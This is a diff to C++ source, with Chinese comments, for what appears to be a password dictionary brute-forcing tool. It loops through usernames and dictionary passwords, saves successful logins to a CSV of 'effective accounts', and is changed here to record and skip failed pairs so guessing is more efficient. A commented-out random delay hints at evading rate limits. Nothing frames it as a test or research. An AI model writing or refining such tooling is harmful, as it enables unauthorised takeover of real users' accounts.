@@ -88,6 +88,9 @@ public:
         // 读取密码字典;
         dic.readDictionary();
 
+        // 读取无效账号信息;
+        dic.readInvalidAccounts();
+
         // 获取有效账户的数目
         effectiveAccountAmount = dic.getEffectiveAccountAmount();
 
@@ -109,6 +112,17 @@ public:
             dic.copyPasswordDictionary();
 
             for (uint32_t i = 0; i < pwdTryNum; ++i) {
+                // 检查并跳过已知的无效密码, 若为无效密码则直接(跳过本次循环)跳过无效密码, 避免重复测试.
+                if (dic.isInvalidAccountsExists(currentUsername, currentPassword) == true) {
+                    // 从密码字典中抽取密码
+                    currentPassword = dic.extractUniquePassword();
+
+                    // 如果密码已被全部抽取完,则结束循环
+                    if (currentPassword == "") break;
+
+                    continue;// 跳过当前循环的剩余部分
+                }
+
                 std::cout << "\r当前用户名(" << usernameNum << "/" << amount << "):" << currentUsername <<
                     "\t当前密码(" << i << "/" << pwdTryNum << "):" << currentPassword << "                ";
 
@@ -118,11 +132,14 @@ public:
 
                 if (respond[0].first == "result" && respond[0].second == "true") {
                     // 登录成功，保存有效账户信息到CSV文件
-                    csv_op.appendToCSV({ { currentUsername , currentPassword } }, "./EffectiveAccount.csv");
+                    csv_op.writeToCSV({ { currentUsername , currentPassword } }, "./EffectiveAccount.csv");
 
-                    // 用于统计有效账户的总数
+                    // 增加有效账户计数
                     ++effectiveAccountNum;
                     break;
+                } else {
+                    // 登录失败, 记录对应用户名的无效密码;
+                    dic.addInvalidAccount(currentUsername, currentPassword);
                 }
 
                 // 从密码字典中抽取密码
@@ -132,8 +149,11 @@ public:
                 if (currentPassword == "") break;
 
                 // 随机延时;
-                // tl.randomDelay(0, 1000);
+                // tl.randomDelay(500, 1000);
             }
+
+            // 将无效账户（用户名和密码集合）保存到CSV文件中。
+            dic.saveInvalidAccounts();
         }
     }
 
